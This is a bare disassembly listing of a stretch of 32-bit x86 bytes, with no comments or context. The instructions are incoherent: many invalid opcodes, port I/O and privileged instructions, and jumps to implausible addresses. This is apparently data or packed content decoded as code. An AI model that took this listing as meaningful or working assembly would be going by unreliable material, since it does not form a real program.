  405fc7:	push   cs
  405fc8:	cmp    ch,BYTE PTR [ebp+esi*4+0x68]
  405fcc:	mov    bl,0xa2
  405fce:	popa   
  405fcf:	jle    0x405fd7
  405fd1:	inc    eax
  405fd2:	fwait
  405fd3:	inc    esp
  405fd4:	jnp    0x406036
  405fd6:	pop    esi
  405fd7:	stc    
  405fd8:	sub    BYTE PTR [ebp-0x2d],0x99
  405fdc:	imul   esp,DWORD PTR [ebx+0x3f04ccc6],0xffffff9f
  405fe3:	sbb    ebx,DWORD PTR [edx-0x59a09195]
  405fe9:	fst    QWORD PTR [ebp-0x4232b4a2]
  405fef:	sahf   
  405ff0:	leave  
  405ff1:	int3   
  405ff2:	sub    eax,DWORD PTR [ecx]
  405ff4:	out    0xec,al
  405ff6:	ficomp WORD PTR [ebx+edi*4+0x32]
  405ffa:	inc    ecx
  405ffb:	mov    al,0x69
  405ffd:	dec    ecx
  405ffe:	lahf   
  405fff:	add    ecx,DWORD PTR [esi+0x31]
  406002:	fdiv   DWORD PTR [ebx-0x3cc07e72]
  406008:	xor    cl,dl
  40600a:	scas   eax,DWORD PTR es:[edi]
  40600b:	xchg   edi,eax
  40600c:	mov    bl,0xf9
  40600e:	adc    al,0xd8
  406010:	popf   
  406011:	add    bl,ch
  406013:	loope  0x406035
  406015:	xchg   esi,eax
  406016:	push   cs
  406017:	jo     0x406048
  406019:	test   esp,edx
  40601b:	cli    
  40601c:	mov    ds:0x4f3ed18f,al
  406021:	mov    ebp,0x424542eb
  406026:	mov    ch,0xd6
  406028:	sub    dh,BYTE PTR [edx+esi*8-0x69]
  40602c:	out    dx,al
  40602d:	retf   0x55ce
  406030:	pop    edi
  406031:	stc    
  406032:	dec    esp
  406033:	xor    al,0x91
  406035:	test   eax,0x9a546c61
  40603a:	and    al,0xf2
  40603c:	divps  xmm6,xmm1
  40603f:	pop    esp
  406040:	gs iret 
  406042:	push   ecx
  406043:	(bad)  
  406044:	cmp    al,0xcb
  406046:	outs   dx,DWORD PTR ds:[esi]
  406047:	mov    dl,0xe2
  406049:	push   esi
  40604a:	xor    DWORD PTR [edi-0x78],esi
  40604d:	lahf   
  40604e:	(bad)  
  40604f:	dec    esp
  406050:	sub    BYTE PTR [ebx-0x7c8c6fca],ch
  406056:	(bad)  
  406057:	push   esp
  406058:	mov    dh,BYTE PTR [eax-0x42]
  40605b:	or     BYTE PTR [ecx-0x57],ah
  40605e:	add    BYTE PTR fs:[ebx-0x731e4cdd],bl
  406065:	or     BYTE PTR [esi+0x27],ah
  406068:	jb     0x406099
  40606a:	xor    esi,eax
  40606c:	es mov eax,0x744f9d2f
  406072:	pop    ss
  406073:	jge    0x406042
  406075:	dec    BYTE PTR [edi-0x28]
  406078:	add    ecx,DWORD PTR [edx]
  40607a:	jns    0x406018
  40607c:	inc    esp
  40607d:	dec    edi
  40607e:	stos   DWORD PTR es:[edi],eax
  40607f:	push   edi
  406080:	dec    ecx
  406081:	add    BYTE PTR [edx+edi*8],dh
  406084:	mov    bl,0xde
  406086:	mov    fs,WORD PTR [edi-0x7711aba6]
  40608c:	nop
  40608d:	loop   0x406052
  40608f:	shr    DWORD PTR [edx],cl
  406091:	dec    ebx
  406092:	pop    esp
  406093:	lock aas 
  406095:	out    0x46,eax
  406097:	sub    al,ch
  406099:	inc    ebx
  40609a:	mov    esi,0x804b828e
  40609f:	push   0xc25fc412
  4060a4:	leave  
  4060a5:	or     eax,0x6d7c419a
  4060aa:	add    edi,DWORD PTR [ebx+0x513eabae]
  4060b0:	jno    0x406081
  4060b2:	pop    esp
  4060b3:	repz push ds
  4060b5:	mov    BYTE PTR [eax],dh
  4060b7:	dec    ecx
  4060b8:	cwde   
  4060b9:	shl    esi,1
  4060bb:	jne    0x4060f6
  4060bd:	sti    
  4060be:	sub    DWORD PTR [ecx],esi
  4060c0:	pop    edi
  4060c1:	outs   dx,DWORD PTR ds:[esi]
  4060c2:	push   cs
  4060c3:	adc    DWORD PTR [eax],ebx
  4060c5:	xchg   esp,eax
  4060c6:	cmp    DWORD PTR [esp+esi*8-0x46],0xe75ba740
  4060ce:	dec    esp
  4060cf:	int    0x82
  4060d1:	xor    BYTE PTR [ebp+eiz*4+0x4a],ah
  4060d5:	shl    BYTE PTR [ecx],cl
  4060d7:	dec    ecx
  4060d8:	mov    edx,0xdb73094d
  4060dd:	in     al,0x8d
  4060df:	fxch   st(2)
  4060e1:	ficom  DWORD PTR [ebp+0x1c4c7fbc]
  4060e7:	in     eax,0xc4
  4060e9:	pop    ebp
  4060ea:	shl    DWORD PTR [ebx-0x4a],0xf2
  4060ee:	pop    ss
  4060ef:	scas   eax,DWORD PTR es:[edi]
  4060f0:	dec    esi
  4060f1:	xlat   BYTE PTR ds:[ebx]
  4060f2:	add    DWORD PTR [esi+0x27],edi
  4060f5:	ret    0x9118
  4060f8:	std    
  4060f9:	dec    eax
  4060fa:	push   edx
  4060fb:	fisub  DWORD PTR [ebx]
  4060fd:	gs (bad) 
  4060ff:	shl    BYTE PTR [ebp+0x2be477f3],1
  406105:	inc    esp
  406106:	clc    
  406107:	and    cl,bh
  406109:	es mov dh,0x40
  40610c:	adc    al,0x46
  40610e:	arpl   WORD PTR [esi+edx*1-0x29],dx
  406112:	ins    DWORD PTR es:[edi],dx
  406113:	xor    al,0x71
  406115:	inc    esp
  406116:	adc    ebp,esi
  406118:	pop    esp
  406119:	mov    bh,0xcc
  40611b:	and    ebp,DWORD PTR [edi]
  40611d:	push   ds
  40611e:	aas    
  40611f:	cmp    bl,BYTE PTR [ebx+0x15]
  406122:	cmp    eax,0xe32225ee
  406127:	loope  0x4060c5
  406129:	arpl   si,cx
  40612b:	enter  0x7dd1,0x1c
  40612f:	xor    DWORD PTR [edi-0x3a37df84],0xf144d62d
  406139:	das    
  40613a:	retf   0x50a8
  40613d:	ja     0x406148
  40613f:	jns    0x4060f0
  406141:	lods   eax,DWORD PTR ds:[esi]
  406142:	sub    BYTE PTR [edi+ebp*8],0x1c
  406146:	xor    ebx,edi
  406148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406149:	cmp    ebp,DWORD PTR [eax+0x50b48d0d]
  40614f:	jmp    0x25a5e6c5
  406154:	mov    al,ds:0x39535e65
  406159:	ds jae 0x4060ea
  40615c:	iret   
  40615d:	or     esp,esp
  40615f:	xchg   esp,eax
  406160:	es gs jae 0x4061c0
  406164:	sbb    cl,BYTE PTR [ecx+0x5c]
  406167:	pop    edi
  406168:	fadd   DWORD PTR [ecx]
  40616a:	popa   
  40616b:	data16 into 
  40616d:	(bad)  
  40616e:	or     BYTE PTR [ecx-0x2c4970aa],dl
  406174:	pop    edx
  406175:	sti    
  406176:	jno    0x40610d
  406178:	sub    al,0x17
  40617a:	ds cld 
  40617c:	ret    
  40617d:	inc    ebx
  40617e:	mov    ah,0xce
  406180:	jg     0x4061e6
  406182:	inc    esi
  406183:	repz loope 0x40616b
  406186:	inc    eax
  406187:	shl    dh,0xd0
  40618a:	popa   
  40618b:	jo     0x406157
  40618d:	cmp    BYTE PTR [esp+esi*1-0x5a132205],dl
  406194:	repz mov WORD PTR [ecx+0x656d2066],gs
  40619b:	or     bl,BYTE PTR [ebx+0x3d44aac3]
  4061a1:	xchg   esi,eax
  4061a2:	xor    ebx,esp
  4061a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061a6:	inc    edi
  4061a7:	mov    ?,WORD PTR [eax+0x2b305fcf]
  4061ad:	loope  0x406189
  4061af:	lock (bad) 
  4061b1:	fimul  DWORD PTR ds:0x6504305
  4061b7:	ret    
  4061b8:	mov    dl,0x63
  4061ba:	cs inc ebx
  4061bc:	xchg   edi,eax
  4061bd:	sub    bh,BYTE PTR es:[edi]
  4061c0:	aam    0x32
  4061c2:	and    eax,0x6b8c710f
  4061c7:	ins    BYTE PTR es:[edi],dx
  4061c8:	add    ah,BYTE PTR [ebx]
  4061ca:	mov    ah,0xa1
  4061cc:	ret    
  4061cd:	aaa    
  4061ce:	inc    edi
  4061cf:	xchg   esi,eax
  4061d0:	lods   al,BYTE PTR ds:[esi]
  4061d1:	xchg   edi,eax
  4061d2:	cmp    al,BYTE PTR [ebx]
  4061d4:	pusha  
  4061d5:	dec    ebp
  4061d6:	pop    ecx
  4061d7:	or     al,0x51
  4061d9:	push   es
  4061da:	cli    
  4061db:	xor    ah,bl
  4061dd:	pop    ebx
  4061de:	int    0xf2
  4061e0:	rol    ebx,0x5c
  4061e3:	mul    BYTE PTR [ebp+0x339a65eb]
  4061e9:	ror    al,0xd8
  4061ec:	jge    0x4061e8
  4061ee:	cdq    
  4061ef:	jbe    0x4061b1
  4061f1:	push   0x4a
  4061f3:	xor    ecx,DWORD PTR [edx+0x4d56350a]
  4061f9:	aam    0xcb
  4061fb:	mov    dl,0xd7
  4061fd:	mov    edi,esp
  4061ff:	sbb    ebp,DWORD PTR [esi]
  406201:	test   eax,0xf77a9785
  406206:	frstor [esi-0x1a]
  406209:	or     al,BYTE PTR [ebp+edx*2+0x3d546562]
  406210:	sub    ebp,ebp
  406212:	popf   
  406213:	xchg   ebp,eax
  406215:	xchg   ebx,eax
  406216:	ds mov bh,0x6d
  406219:	test   BYTE PTR [ecx-0x1ec7ed53],0xe6
  406220:	adc    BYTE PTR [eax-0x50],bl
  406223:	and    eax,0x78966884
  406228:	cli    
  406229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40622a:	(bad)  
  40622b:	ss in  eax,dx
  40622d:	out    dx,al
  40622e:	mov    al,0x89
  406230:	outs   dx,DWORD PTR ds:[esi]
  406231:	fs rol ecx,1
  406234:	pop    ebp
  406235:	fcom   DWORD PTR [edi+0x63b51afa]
  40623b:	mov    BYTE PTR [ebp+0x5db2d6d5],al
  406241:	fwait
  406242:	test   eax,0xaa3ff4f3
  406247:	mov    ebx,0xa53976d9
  40624c:	xchg   BYTE PTR [esi-0x76],bl
  40624f:	and    ebp,ebp
  406251:	push   cs
  406252:	mov    dh,0x65
  406254:	out    dx,al
  406255:	or     al,0xdd
  406257:	inc    ebp
  406258:	out    0xd2,eax
  40625a:	mov    al,0xfb
  40625c:	adc    eax,0x6577fa2e
  406261:	sti    
  406262:	xor    edi,DWORD PTR [eax-0x4e8bf9e3]
  406268:	jno    0x40625f
  40626a:	cmp    al,0x9a
  40626c:	cwde   
  40626d:	test   eax,0x104b16cf
  406272:	dec    ebp
  406273:	add    BYTE PTR [eax-0x35f5128b],bh
  406279:	pop    ecx
  40627a:	push   esi
  40627b:	sub    eax,0x5c4d00c2
  406280:	jb     0x4062d9
  406282:	and    eax,0x6ebee69b
  406287:	test   al,0x22
  406289:	ret    0xb20b
  40628c:	inc    eax
  40628d:	pushf  
  40628e:	inc    esi
  40628f:	cmc    
  406290:	mov    DWORD PTR [edx],esp
  406292:	inc    esi
  406293:	stos   DWORD PTR es:[edi],eax
  406294:	jecxz  0x406216
  406296:	or     eax,0x61e6ef79
  40629b:	push   DWORD PTR [eax]
  40629d:	ss pop edx
  4062a0:	fcmovbe st,st(7)
  4062a2:	mov    ds:0x4206506c,al
  4062a7:	or     al,0xae
  4062a9:	xor    al,0x4e
  4062ab:	mov    ebx,0x5c42fe0a
  4062b0:	lods   eax,DWORD PTR ds:[esi]
  4062b1:	sub    ebp,ebx
  4062b3:	push   edi
  4062b4:	and    DWORD PTR [ecx+esi*8+0x38],ebp
  4062b8:	mov    ds:0x9f99e906,eax
  4062bd:	jle    0x4062d4
  4062bf:	inc    ecx
  4062c0:	aas    
  4062c1:	retf   
  4062c2:	sub    al,BYTE PTR [eax-0x6e]
  4062c5:	cmp    al,0x57
  4062c7:	in     al,dx
  4062c8:	adc    DWORD PTR [eax-0x7ce6738b],eax
  4062ce:	sub    eax,0xf461fe3b
  4062d4:	mul    DWORD PTR [esi]
  4062d6:	ja     0x40633b
  4062d8:	pop    eax
  4062d9:	xchg   ebp,eax
  4062da:	jge    0x406343
  4062dc:	xor    al,0x95
  4062de:	xor    eax,0x1c954581
  4062e3:	pop    ebp
  4062e4:	ret    
  4062e5:	inc    edx
  4062e6:	jne    0x4062e5
  4062e8:	cwde   
  4062e9:	mov    dl,0x78
  4062eb:	mov    eax,ds:0x72fee5da
  4062f0:	out    dx,eax
  4062f1:	jae    0x406335
  4062f3:	sub    BYTE PTR [ecx+eiz*4-0x2e16cf02],cl
  4062fa:	div    cl
  4062fc:	adc    bh,BYTE PTR [ebp+0x2f]
  4062ff:	aam    0x2b
  406301:	jbe    0x40630d
  406303:	jecxz  0x406381
  406305:	out    0xe0,al
  406307:	(bad)  
  406308:	ins    BYTE PTR es:[edi],dx
  406309:	cmp    BYTE PTR [eax],ch
  40630b:	pop    ss
  40630c:	pushf  
  40630d:	test   DWORD PTR [eax+edx*2-0x57cdde10],ecx
  406314:	or     al,0xe1
  406316:	dec    eax
  406317:	repz jmp 0x4062ef
  40631a:	stc    
  40631b:	iret   
  40631c:	lds    esi,FWORD PTR [esi+0x41386280]
  406322:	mov    edx,0x9e64a26f
  406327:	or     eax,0x680bfc81
  40632c:	bound  ebp,QWORD PTR [edx]
  40632e:	push   0x54090c6e
  406333:	xor    DWORD PTR [ebx],0xa08e6a6d
  406339:	inc    eax
  40633a:	(bad)  
  40633b:	sub    BYTE PTR [edx],bh
  40633d:	(bad)  
  40633f:	cmp    eax,0xa183d0e3
  406344:	jmp    0x4062ea
  406346:	call   0xb7457c00
  40634b:	icebp  
  40634c:	sub    al,0x85
  40634e:	cli    
  40634f:	outs   dx,BYTE PTR ds:[esi]
  406350:	sti    
  406351:	call   0xab90:0x8bd2149e
  406358:	inc    ebp
  406359:	xlat   BYTE PTR ds:[ebx]
  40635a:	or     DWORD PTR [ecx+0x39],0xc
  40635e:	rcr    ecx,0x73
  406361:	push   0x17
  406363:	test   BYTE PTR [edx+0x68],dl
  406366:	test   al,0x19
  406368:	test   eax,0x11a4b320
  40636d:	sub    DWORD PTR [bx-0x44],0xffffffb7
  406372:	cli    
  406373:	jmp    0x406314
  406375:	outs   dx,DWORD PTR ds:[esi]
  406376:	xor    ebx,ebx
  406378:	add    eax,esp
  40637a:	xchg   BYTE PTR [ebx+0x45],cl
  40637d:	retf   0x74a9
  406380:	imul   edx,eax,0x70
  406383:	(bad)  [esi-0x27]
  406386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406387:	mov    ds:0x67b0b2be,eax
  40638c:	aas    
  40638d:	adc    al,BYTE PTR [esi+0x53]
  406390:	imul   ecx,DWORD PTR [edi+0x64],0xffac3c70
  406397:	cwde   
  406398:	inc    ecx
  406399:	xor    eax,0x2d83927
  40639e:	in     al,dx
  40639f:	push   eax
  4063a0:	scas   eax,DWORD PTR es:[edi]
  4063a1:	daa    
  4063a2:	cmp    DWORD PTR [ebx+0x2b],ebx
  4063a5:	repz leave 
  4063a7:	popa   
  4063a8:	xchg   ebp,eax
  4063a9:	xor    ah,0x12
  4063ac:	sbb    ebx,DWORD PTR [edi+0x3a]
  4063af:	test   BYTE PTR [ebp+0x5a],cl
  4063b2:	in     al,dx
  4063b3:	and    al,0x94
  4063b5:	sbb    DWORD PTR [esi-0x1a231393],esp
  4063bb:	mov    cl,0x67
  4063bd:	lea    ebp,[edx+edi*2-0x6f]
  4063c1:	xchg   edi,eax
  4063c2:	shl    esi,1
  4063c4:	ror    cl,0x74
  4063c7:	or     dl,dh
  4063c9:	mov    eax,0x33658656
  4063ce:	push   DWORD PTR ds:0xa180d70d
  4063d4:	sub    cl,BYTE PTR ds:0xd8092cd0
  4063da:	fsub   DWORD PTR [ebx-0x31]
  4063dd:	leave  
  4063de:	push   bx
  4063e0:	inc    esp
  4063e1:	jecxz  0x406438
  4063e3:	mov    BYTE PTR [esi-0x3],dh
  4063e6:	and    al,bl
  4063e8:	inc    ebp
  4063e9:	push   es
  4063ea:	add    al,0x98
  4063ec:	mov    al,ds:0x29e1c983
  4063f1:	jg     0x406433
  4063f3:	push   edx
  4063f4:	pop    edi
  4063f5:	in     eax,dx
  4063f6:	stos   BYTE PTR es:[edi],al
  4063f7:	fstp   DWORD PTR [edx+0x357763e2]
  4063fd:	out    0xbd,al
  4063ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406401:	push   ebx
  406402:	sbb    DWORD PTR [ecx+0x222318a3],eax
  406408:	in     al,dx
  406409:	sahf   
  40640a:	inc    edi
  40640b:	pop    ecx
  40640c:	jmp    0x1c0d:0xa5f745bc
  406413:	dec    esp
  406414:	loop   0x4063a1
  406416:	inc    ebp
  406417:	and    eax,0x7db1f56c
  40641c:	jo     0x4063d7
  40641e:	jno    0x406467
  406420:	adc    DWORD PTR [ebp+0x53],edi
  406423:	fisubr DWORD PTR [eax]
  406425:	cld    
  406426:	out    dx,al
  406427:	arpl   WORD PTR [ecx],di
  406429:	sub    edx,DWORD PTR [ebx-0x7bb9b098]
  40642f:	loope  0x4063e3
  406431:	and    ecx,edi
  406433:	lods   al,BYTE PTR ds:[esi]
  406434:	test   DWORD PTR [ebp*2-0x2dcea259],edi
  40643b:	xor    cl,bl
  40643d:	repnz sub edx,DWORD PTR ds:0xf25893e5
  406444:	add    eax,0xa960f74f
  406449:	mov    ch,0x84
  40644b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40644c:	hlt    
  40644d:	lea    esi,fs:[ebx-0x1827359c]
  406454:	dec    ebx
  406455:	outs   dx,BYTE PTR ds:[esi]
  406456:	or     DWORD PTR [eax-0x25],ecx
  406459:	outs   dx,DWORD PTR ds:[esi]
  40645a:	xor    ebp,DWORD PTR [ebp-0x7b]
  40645d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40645e:	mov    DWORD PTR [edx+0x26],ebp
  406461:	lahf   
  406462:	adc    BYTE PTR [ebx+0xf],ah
  406465:	inc    eax
  406466:	shl    BYTE PTR [esp+eax*1+0x6fcb4902],0x78
  40646e:	push   0xd99b1d52
  406473:	(bad)  [edi+0x7d]
  406476:	dec    edi
  406477:	fdiv   QWORD PTR [edi-0x58]
  40647a:	pop    ebx
  40647b:	pop    ss
  40647c:	push   0xffffffa8
  40647e:	adc    BYTE PTR [ebp-0x50],bl
  406481:	imul   eax,DWORD PTR [esi+eax*8],0x9d8be514
  406488:	dec    ebx
  406489:	mov    eax,0x1ef7bb4b
  40648e:	and    BYTE PTR [ebx-0x408c077],bl
  406494:	sbb    DWORD PTR [eax-0x324f3db2],ebp
  40649a:	iret   
  40649b:	aam    0xd0
  40649d:	idiv   BYTE PTR [esi]
  40649f:	inc    edx
  4064a0:	adc    bh,BYTE PTR [edi+0x7b]
  4064a3:	imul   edi,ecx,0xffffff99
  4064a6:	mov    bl,0x60
  4064a8:	mov    dl,0xce
  4064aa:	xchg   bp,ax
  4064ac:	add    cl,BYTE PTR [edi+0x14b6214c]
  4064b2:	mov    dh,0x4b
  4064b4:	nop
  4064b5:	aam    0xd4
  4064b7:	(bad)  
  4064b8:	mov    dh,0xa2
  4064ba:	xor    bh,BYTE PTR [edi-0x6a]
  4064bd:	loop   0x40644c
  4064bf:	mov    DWORD PTR [edi-0x1e],edi
  4064c2:	mov    eax,ds:0x6f3c15ac
  4064c7:	mov    edx,0x71c4f4f3
  4064cc:	popf   
  4064cd:	sbb    al,0xa0
  4064cf:	adc    ebp,esp
  4064d1:	sub    DWORD PTR [ebp-0x7654f6a],0x5c584619
  4064db:	jnp    0x40649d
  4064dd:	jb     0x4064ac
  4064df:	mov    ch,0x77
  4064e1:	sti    
  4064e2:	mov    DWORD PTR [ebp+0x3b9a6818],0x78bc612c
  4064ec:	pop    eax
  4064ed:	test   bh,ah
  4064ef:	jae    0x406531
  4064f1:	jp     0x40656e
  4064f3:	js     0x406481
  4064f5:	shr    ebx,1
  4064f7:	cmc    
  4064f8:	jne    0x4064bc
  4064fa:	pusha  
  4064fb:	icebp  
  4064fc:	add    bl,BYTE PTR [ecx]
  4064fe:	adc    BYTE PTR [eax],0x10
  406501:	adc    bh,bl
  406503:	mov    eax,ds:0x5babe262
  406508:	add    al,BYTE PTR [esi+0xc]
  40650b:	inc    edi
  40650c:	adc    edx,eax
  40650e:	ja     0x406589
  406510:	hlt    
  406511:	fwait
  406512:	ret    0x8a3b
  406515:	push   esi
  406516:	sub    edx,0xb3450787
  40651c:	and    al,0xd5
  40651e:	xchg   DWORD PTR [esi+0x3a],esp
  406521:	dec    edi
  406522:	ffreep st(1)
  406524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406525:	lock push cs
  406527:	arpl   WORD PTR [edx+0x1f209ed5],bx
  40652d:	or     eax,DWORD PTR [edi-0x63]
  406530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406531:	int3   
  406532:	sub    bl,bl
  406534:	inc    esp
  406535:	push   es
  406536:	int3   
  406537:	push   0x6f2c7590
  40653c:	outs   dx,BYTE PTR ds:[esi]
  40653d:	inc    esi
  40653e:	loop   0x4065b7
  406540:	mov    esi,0xb1c248ee
  406545:	pop    ds
  406546:	and    al,0xe6
  406548:	pop    es
  406549:	pusha  
  40654a:	xlat   BYTE PTR ds:[ebx]
  40654b:	dec    eax
  40654c:	js     0x40657b
  40654e:	call   0xcf6d82d0
  406553:	idiv   BYTE PTR [ebx]
  406555:	mov    ds:0x5e5202c9,al
  40655a:	mov    ds:0x59a64085,al
  40655f:	loop   0x406530
  406561:	xchg   ecx,eax
  406562:	rcl    DWORD PTR [edx],1
  406564:	mov    edi,0x72151dbc
  406569:	and    eax,DWORD PTR [edx-0x5a949aed]
  40656f:	push   edx
  406570:	and    eax,0x482a8a12
  406575:	fiadd  DWORD PTR [edx-0x5c7d9fdb]
  40657b:	pop    esp
  40657c:	(bad)
  406580:	hlt    
  406581:	lock aaa 
  406583:	mov    dh,0x9a
  406585:	pop    ebx
  406586:	rol    dl,0x54
  406589:	or     dh,BYTE PTR [ebx+ebx*2-0x2b]
  40658d:	mov    bl,0xdc
  40658f:	lea    ebx,[ecx]
  406591:	mov    ds,edx
  406593:	sti    
  406594:	dec    edx
  406595:	xchg   esp,eax
  406596:	cmp    DWORD PTR [edi+0xc],esp
  406599:	jl     0x4065ad
  40659b:	pop    edx
  40659c:	add    dl,cl
  40659e:	shl    BYTE PTR [ebp-0x678a86f9],cl
  4065a4:	retf   0xd57d
  4065a7:	ins    WORD PTR es:[edi],dx
  4065a9:	xchg   edx,eax
  4065aa:	or     eax,0xd62a5883
  4065af:	hlt    
  4065b0:	xchg   ecx,eax
  4065b1:	mov    WORD PTR [esi+eax*2+0x560bd27e],fs
  4065b8:	aam    0x63
  4065ba:	ja     0x406550
  4065bc:	repnz inc edx
  4065be:	out    dx,al
  4065bf:	fcmovnu st,st(6)
  4065c1:	inc    esp
  4065c2:	loop   0x406609
  4065c4:	hlt    
  4065c5:	pop    ss
  4065c6:	xchg   esp,eax
  4065c7:	mov    ?,WORD PTR [eax+0xd]
  4065ca:	out    0x9,eax
  4065cc:	add    eax,0x3f9f6b77
  4065d1:	sti    
  4065d2:	out    dx,al
  4065d3:	cmc    
  4065d4:	int3   
  4065d5:	pop    esp
  4065d6:	sbb    eax,0xa3a332ed
  4065db:	mov    eax,0x240736d6
  4065e0:	push   edi
  4065e1:	dec    edx
  4065e2:	daa    
  4065e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065e4:	mov    ds:0x6de094b,eax
  4065e9:	dec    BYTE PTR [edi-0x39]
  4065ec:	mov    ds:0x2e3443f7,al
  4065f1:	mov    ds:0x437f14b3,al
  4065f6:	adc    ebx,esi
  4065f8:	fisub  WORD PTR [edx]
  4065fa:	test   al,0xc8
  4065fc:	rcr    ch,cl
  4065fe:	sub    bh,BYTE PTR [ebp+0x2f4ef3ab]
  406604:	mov    al,0x6a
  406606:	push   edx
  406607:	adc    al,0x6b
  406609:	pop    ebx
  40660a:	jns    0x40659a
  40660c:	dec    ebx
  40660d:	test   al,0x3f
  40660f:	push   ecx
  406610:	push   ds
  406611:	imul   edi,DWORD PTR [edx-0x215220d6],0xffffffc1
  406618:	daa    
  406619:	jmp    0xf04c60ed
  40661e:	push   esi
  40661f:	mov    bh,0x88
  406621:	cmp    BYTE PTR [ecx],0x43
  406624:	inc    esi
  406625:	sbb    bh,BYTE PTR [eax+0x8ca0e96]
  40662b:	mov    ds:0x900d7165,al
  406630:	xchg   BYTE PTR [edx+esi*2-0x3f543a56],dl
  406637:	into   
  406638:	mov    ebp,0xbeee39f9
  40663d:	fcom   QWORD PTR [edi+0x5d]
  406640:	push   0xaabc97c6
  406645:	retf   0xc8c9
  406648:	into   
  406649:	dec    ecx
  40664a:	pop    ebp
  40664b:	jp     0x4065cf
  40664d:	call   0xbe02:0x301d8325
  406654:	pop    esp
  406655:	xchg   edi,eax
  406656:	inc    esi
  406657:	shr    DWORD PTR [ebx-0x1d],1
  40665a:	or     esp,DWORD PTR [ecx-0x4e]
  40665d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40665e:	push   ss
  40665f:	xor    al,0x9
  406661:	pop    ecx
  406662:	mov    ah,BYTE PTR [eax+0xe]
  406665:	(bad)  [esi-0x1b]
  406668:	jmp    0xda6c3abb
  40666d:	ss ins BYTE PTR es:[edi],dx
  40666f:	call   0x249acd86
  406674:	rol    DWORD PTR ds:[ebp-0x3df602b2],0x56
  40667c:	cmp    al,ch
  40667e:	adc    BYTE PTR [esi],bl
  406680:	pop    ecx
  406681:	inc    edx
  406682:	cdq    
  406683:	push   0x3a
  406685:	les    ebx,FWORD PTR [eax+ebx*1]
  406688:	inc    edi
  406689:	loope  0x406621
  40668b:	dec    ebp
  40668c:	daa    
  40668d:	aaa    
  40668e:	adc    al,0xb8
  406690:	das    
  406691:	das    
  406692:	mov    al,0x25
  406694:	xchg   esp,eax
  406695:	scas   eax,DWORD PTR es:[edi]
  406696:	jae    0x4066b7
  406698:	pop    edx
  406699:	lods   eax,DWORD PTR ds:[esi]
  40669a:	stos   BYTE PTR es:[edi],al
  40669b:	imul   DWORD PTR [esi-0x42ea9703]
  4066a1:	sbb    al,0x35
  4066a3:	fist   DWORD PTR [esi]
  4066a5:	ret    0xd340
  4066a8:	mov    ecx,ss
  4066aa:	dec    eax
  4066ab:	pop    ebx
  4066ac:	add    bl,bl
  4066ae:	jne    0x406653
  4066b0:	sbb    eax,0x52fbfc5b
  4066b5:	mov    eax,0x2cfe7310
  4066ba:	mov    BYTE PTR [ebx-0x742a5fb3],dl
  4066c0:	shl    BYTE PTR [edi],1
  4066c2:	pop    ebp
  4066c3:	adc    al,0x8d
  4066c5:	xchg   esi,eax
  4066c6:	(bad)  
  4066c7:	jns    0x40669c
  4066c9:	cmc    
  4066ca:	scas   eax,DWORD PTR es:[edi]
  4066cb:	add    bl,BYTE PTR [ecx-0x7b]
  4066ce:	inc    ecx
  4066cf:	test   eax,ecx
  4066d1:	jne    0x406672
  4066d3:	shl    DWORD PTR [eax+0x3f],1
  4066d6:	pop    esi
  4066d7:	jae    0x406705
  4066d9:	dec    esp
  4066da:	jne    0x4066f7
  4066dc:	stc    
  4066dd:	pop    edi
  4066de:	fstp   QWORD PTR [edx-0x41129e37]
  4066e4:	retf   0xea34
  4066e7:	out    dx,eax
  4066e8:	sar    DWORD PTR [edx-0x7c2c9d52],1
  4066ee:	mov    esi,0x35d78e02
  4066f3:	jge    0x4066fc
  4066f5:	jl     0x4066cd
  4066f7:	cmp    bl,ah
  4066f9:	pop    ebp
  4066fa:	icebp  
  4066fb:	jge    0x406764
  4066fd:	xchg   BYTE PTR [edx-0x3eef7437],ch
  406703:	call   0x2a1b49ab
  406708:	pop    esp
  406709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40670a:	int3   
  40670b:	ss (bad) 
  40670d:	out    0xf5,al
  40670f:	mov    esi,0xfeacdd5d
  406714:	lds    ecx,FWORD PTR [ebx-0x6e]
  406717:	gs fdivr st,st(4)
  40671a:	mov    ebx,0x3d0a8afa
  40671f:	icebp  
  406720:	push   esp
  406721:	inc    ebx
  406722:	mov    eax,ebp
  406724:	sbb    ebx,ebx
  406726:	icebp  
  406727:	jle    0x4066c2
  406729:	push   esp
  40672a:	sub    bh,bh
  40672c:	pop    esi
  40672d:	sub    dh,BYTE PTR ds:0xe42bf1d1
  406733:	(bad)  
  406734:	xchg   esp,eax
  406735:	aaa    
  406736:	cmp    BYTE PTR [ebp+0x5c124176],bl
  40673c:	sub    al,0x37
  40673e:	enter  0x9f97,0xc0
  406742:	arpl   WORD PTR [edx-0x5e],sp
  406745:	repnz and edi,DWORD PTR [ecx+ecx*8]
  406749:	inc    eax
  40674a:	fild   DWORD PTR [esi+eiz*8-0xf87a31b]
  406751:	push   0xffffff97
  406753:	mov    edi,DWORD PTR [esi+0x41dcbc7b]
  406759:	sub    bl,BYTE PTR [ecx-0x6c53278f]
  40675f:	xchg   ebp,eax
  406760:	loope  0x40670f
  406762:	fsubr  QWORD PTR [ebp+0x53]
  406765:	std    
  406766:	mov    BYTE PTR [esi+0x1f],ah
  406769:	mov    ebp,0x198a07a2
  40676e:	in     al,0xec
  406770:	or     ebp,edi
  406772:	push   edi
  406773:	ror    ch,cl
  406775:	loop   0x40676b
  406777:	mov    DWORD PTR [ebp+0x23b8f95],ecx
  40677d:	ficom  DWORD PTR [ebx-0x7f]
  406780:	(bad)  
  406781:	imul   BYTE PTR [edx-0x606c75fa]
  406787:	adc    bh,dh
  406789:	mov    ds:0x33c43989,al
  40678e:	ss push esi
  406790:	dec    ebp
  406791:	and    bl,BYTE PTR [edx+0xf]
  406794:	push   0xffffffe5
